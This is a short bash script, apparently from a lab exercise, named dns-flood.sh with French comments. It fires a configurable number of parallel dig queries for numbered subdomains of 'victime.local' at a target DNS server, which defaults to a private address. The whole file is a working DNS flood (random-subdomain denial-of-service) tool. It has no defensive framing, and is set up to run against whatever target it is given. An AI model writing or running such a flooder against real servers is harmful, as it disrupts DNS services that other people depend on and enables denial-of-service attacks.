#!/bin/bash
# Usage: dns-flood.sh [target_ip] [nb_requetes]
TARGET=${1:-${VICTIME_IP:-10.30.10.20}}
COUNT=${2:-500}

echo "[*] DNS flood vers $TARGET ($COUNT requetes)..."
for i in $(seq 1 $COUNT); do
  dig @"$TARGET" "sub${i}.victime.local" +short >/dev/null 2>&1 &
  if [ $((i % 50)) -eq 0 ]; then
    sleep 0.1
  fi
done
wait
echo "[+] Done. $COUNT requetes envoyees."
